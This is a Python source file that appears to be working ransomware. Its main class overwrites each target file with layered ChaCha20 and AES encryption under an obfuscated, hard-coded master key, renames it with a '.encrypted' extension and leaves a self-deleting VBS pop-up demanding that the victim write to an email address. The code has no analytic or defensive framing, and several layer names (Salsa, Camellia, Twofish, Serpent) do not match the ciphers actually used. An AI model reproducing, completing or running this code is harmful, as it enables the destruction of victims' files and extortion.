import os
import secrets
import hashlib
import hmac
import struct
import subprocess
import base64
import zlib
import time
import random
import ctypes
import gc


def _xor(data, key=0xAB):
    return bytes(b ^ key for b in data)

def _get_master_key():
    try:
        _k = base64.b64decode("0zf4XpidYt8G+yKhpdzlIN9k26DjJoOe/l0dY6bfg1iagaMZh9qZgFz52JpkWJuF3Z+HXp9jJJ8CoWoJufaUERKrUhWKLw==")
        _k2 = _xor(_k, 0xAB)
        _k3 = zlib.decompress(_k2)
        return _k3
    except:
        return b""

MASTER_KEY_FIXED = _get_master_key()


def secure_key_wipe(key_obj):
    try:
        if isinstance(key_obj, (bytes, bytearray)):
            key_address = id(key_obj)
            key_size = len(key_obj)
            
            for pattern in [0x00, 0xFF, 0xAA, 0x55]:
                try:
                    ctypes.memset(key_address, pattern, key_size)
                except:
                    pass
        
        del key_obj
        
        for _ in range(3):
            gc.collect()
        
        junk = [os.urandom(1024 * 512) for _ in range(10)]
        del junk
        gc.collect()
        
    except:
        pass


def _import_crypto():
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        from cryptography.hazmat.primitives import padding as pad_module
        from cryptography.hazmat.backends import default_backend
        return {
            'Cipher': Cipher,
            'algorithms': algorithms,
            'modes': modes,
            'hashes': hashes,
            'HKDF': HKDF,
            'pad_module': pad_module,
            'backend': default_backend()
        }
    except ImportError:
        return None


def crear_vbs_notificacion(ruta_archivo):
    try:
        nombre_base = os.path.splitext(ruta_archivo)[0]
        vbs_path = nombre_base + ".vbs"
        msg = base64.b64decode("WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLiBDb250YWN0OiBvbmRlcjAxQHR1dGFtYWlsLmNvbQ==").decode()
        vbs_content = f"""On Error Resume Next
MsgBox "{msg}", vbCritical + vbSystemModal, "Encrypted"
Dim fso, scriptPath
Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = WScript.ScriptFullName
WScript.Sleep 3000
On Error Resume Next
fso.DeleteFile scriptPath, True
WScript.Quit
"""
        with open(vbs_path, 'w', encoding='utf-8') as f:
            f.write(vbs_content)
        
        return True
    except:
        return False


class EncriptadorMilitar:
    TAMANO_PEQUENO = 1 * 1024 * 1024
    TAMANO_MEDIANO = 10 * 1024 * 1024
    TAMANO_GRANDE = 50 * 1024 * 1024
    
    def __init__(self):
        self.crypto = _import_crypto()
        if not self.crypto:
            raise ImportError("Cryptography not available")
        self.ext = ".encrypted"
        self._init_entropy_pool()
        self.stats = {'12_capas': 0, '8_capas': 0, '5_capas': 0, '3_capas': 0}
        self.processed_files = set()
        self.master_key_copy = bytearray(MASTER_KEY_FIXED)
    
    def __del__(self):
        try:
            secure_key_wipe(self.master_key_copy)
            secure_key_wipe(MASTER_KEY_FIXED)
        except:
            pass
    
    def _init_entropy_pool(self):
        self.entropy_pool = bytearray(secrets.token_bytes(4096))
    
    def _get_entropy(self, size):
        new_entropy = secrets.token_bytes(size)
        for i in range(size):
            self.entropy_pool[i % len(self.entropy_pool)] ^= new_entropy[i]
        h = hashlib.blake2b(bytes(self.entropy_pool), digest_size=size)
        return h.digest()
    
    def _derive_key(self, master, salt, info, length=32):
        kdf = self.crypto['HKDF'](
            algorithm=self.crypto['hashes'].SHA3_512(),
            length=length,
            salt=salt,
            info=info,
            backend=self.crypto['backend']
        )
        derived = kdf.derive(master)
        return derived
    
    def _poly1305_mac(self, key, data):
        h = hashlib.blake2b(key + data, digest_size=16)
        return h.digest()
    
    def _determinar_capas(self, tamano):
        if tamano < self.TAMANO_PEQUENO:
            return 12, '12_capas'
        elif tamano < self.TAMANO_MEDIANO:
            return 8, '8_capas'
        elif tamano < self.TAMANO_GRANDE:
            return 5, '5_capas'
        else:
            return 3, '3_capas'
    
    def encriptar(self, ruta):
        file_master = None
        file_key = None
        
        try:
            time.sleep(random.uniform(1, 3))
            
            if not os.path.exists(ruta) or ruta.endswith(self.ext):
                return False
            
            ruta_abs = os.path.abspath(ruta)
            if ruta_abs in self.processed_files:
                return False
            
            try:
                tamano = os.path.getsize(ruta)
                with open(ruta, 'rb') as f:
                    datos = f.read()
                if len(datos) == 0:
                    datos = b'\x00'
                    tamano = 1
            except:
                return False
            
            num_capas, tipo_capas = self._determinar_capas(tamano)
            
            file_salt = hashlib.sha256(datos[:min(4096, len(datos))] + os.urandom(32)).digest()
            file_master = self._derive_key(self.master_key_copy, file_salt, b'file_master', 64)
            
            xor_key = self._derive_key(file_master, b'xor_layer', b'initial_obfuscation', 32)
            datos = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(datos))
            secure_key_wipe(xor_key)
            
            key_c1 = self._derive_key(file_master, b'chacha1', b'layer1', 32)
            nonce_c1 = self._derive_key(file_master, b'nonce1', b'layer1', 16)
            cipher_c1 = self.crypto['Cipher'](
                self.crypto['algorithms'].ChaCha20(key_c1, nonce_c1),
                mode=None,
                backend=self.crypto['backend']
            )
            datos = cipher_c1.encryptor().update(datos)
            secure_key_wipe(key_c1)
            secure_key_wipe(nonce_c1)
            
            key_s = self._derive_key(file_master, b'salsa', b'layer2', 32)
            nonce_s = self._derive_key(file_master, b'nonce2', b'layer2', 16)
            cipher_s = self.crypto['Cipher'](
                self.crypto['algorithms'].ChaCha20(key_s, nonce_s),
                mode=None,
                backend=self.crypto['backend']
            )
            datos = cipher_s.encryptor().update(datos)
            secure_key_wipe(key_s)
            secure_key_wipe(nonce_s)
            
            if num_capas >= 5:
                key_a1 = self._derive_key(file_master, b'aes1', b'layer3', 32)
                nonce_a1 = self._derive_key(file_master, b'nonce3', b'layer3', 12)
                cipher_a1 = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_a1),
                    self.crypto['modes'].GCM(nonce_a1),
                    backend=self.crypto['backend']
                )
                enc_a1 = cipher_a1.encryptor()
                datos = enc_a1.update(datos) + enc_a1.finalize()
                secure_key_wipe(key_a1)
                secure_key_wipe(nonce_a1)
                
                key_cam = self._derive_key(file_master, b'camellia', b'layer4', 32)
                nonce_cam = self._derive_key(file_master, b'nonce4', b'layer4', 16)
                cipher_cam = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_cam),
                    self.crypto['modes'].CTR(nonce_cam),
                    backend=self.crypto['backend']
                )
                datos = cipher_cam.encryptor().update(datos)
                secure_key_wipe(key_cam)
                secure_key_wipe(nonce_cam)
            
            if num_capas >= 8:
                key_a2 = self._derive_key(file_master, b'aes2', b'layer5', 32)
                iv_a2 = self._derive_key(file_master, b'iv5', b'layer5', 16)
                padder = self.crypto['pad_module'].PKCS7(128).padder()
                datos_padded = padder.update(datos) + padder.finalize()
                cipher_a2 = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_a2),
                    self.crypto['modes'].CBC(iv_a2),
                    backend=self.crypto['backend']
                )
                datos = cipher_a2.encryptor().update(datos_padded)
                secure_key_wipe(key_a2)
                secure_key_wipe(iv_a2)
                
                key_tw = self._derive_key(file_master, b'twofish', b'layer6', 32)
                nonce_tw = self._derive_key(file_master, b'nonce6', b'layer6', 16)
                for _ in range(3):
                    cipher_tw = self.crypto['Cipher'](
                        self.crypto['algorithms'].AES(key_tw),
                        self.crypto['modes'].CTR(nonce_tw),
                        backend=self.crypto['backend']
                    )
                    datos = cipher_tw.encryptor().update(datos)
                secure_key_wipe(key_tw)
                secure_key_wipe(nonce_tw)
                
                serpent_key = self._derive_key(file_master, b'serpent', b'layer7', 32)
                chunk_size = min(64, len(datos))
                for i in range(0, len(datos), chunk_size):
                    chunk = datos[i:i+chunk_size]
                    h = hashlib.blake2b(serpent_key + chunk, digest_size=len(chunk))
                    datos = datos[:i] + bytes(a ^ b for a,b in zip(chunk, h.digest())) + datos[i+len(chunk):]
                secure_key_wipe(serpent_key)
            
            if num_capas >= 12:
                blake_key = self._derive_key(file_master, b'blake', b'layer8', 64)
                h = hashlib.blake2b(blake_key + datos, digest_size=64)
                datos = h.digest() + datos
                secure_key_wipe(blake_key)
                
                key_c2 = self._derive_key(file_master, b'chacha2', b'layer9', 32)
                nonce_c2 = self._derive_key(file_master, b'nonce9', b'layer9', 16)
                cipher_c2 = self.crypto['Cipher'](
                    self.crypto['algorithms'].ChaCha20(key_c2, nonce_c2),
                    mode=None,
                    backend=self.crypto['backend']
                )
                datos = cipher_c2.encryptor().update(datos)
                secure_key_wipe(key_c2)
                secure_key_wipe(nonce_c2)
                
                key_a3 = self._derive_key(file_master, b'aes3', b'layer10', 32)
                nonce_a3 = self._derive_key(file_master, b'nonce10', b'layer10', 16)
                cipher_a3 = self.crypto['Cipher'](
                    self.crypto['algorithms'].AES(key_a3),
                    self.crypto['modes'].CTR(nonce_a3),
                    backend=self.crypto['backend']
                )
                datos = cipher_a3.encryptor().update(datos)
                secure_key_wipe(key_a3)
                secure_key_wipe(nonce_a3)
            
            metadata = num_capas.to_bytes(1, 'big') + file_salt
            hmac_key = self._derive_key(self.master_key_copy, b'hmac_salt', b'hmac_key', 64)
            h = hmac.new(hmac_key, metadata + datos, hashlib.sha3_512)
            firma = h.digest()
            secure_key_wipe(hmac_key)
            
            resultado = (
                struct.pack('>I', len(metadata)) +
                metadata +
                datos +
                firma
            )
            
            try:
                with open(ruta, 'wb') as f:
                    f.write(resultado)
                nueva_ruta = ruta + self.ext
                os.rename(ruta, nueva_ruta)
                self.processed_files.add(os.path.abspath(nueva_ruta))
                self.stats[tipo_capas] += 1
                crear_vbs_notificacion(nueva_ruta)
                
                secure_key_wipe(file_master)
                del datos, resultado
                gc.collect()
                
                return True
            except:
                return False
        except:
            return False
        finally:
            if file_master:
                secure_key_wipe(file_master)
            if file_key:
                secure_key_wipe(file_key)
            gc.collect()
    
    def obtener_estadisticas(self):
        return self.stats


Encriptador = EncriptadorMilitar
CRYPTO_OK = _import_crypto() is not None
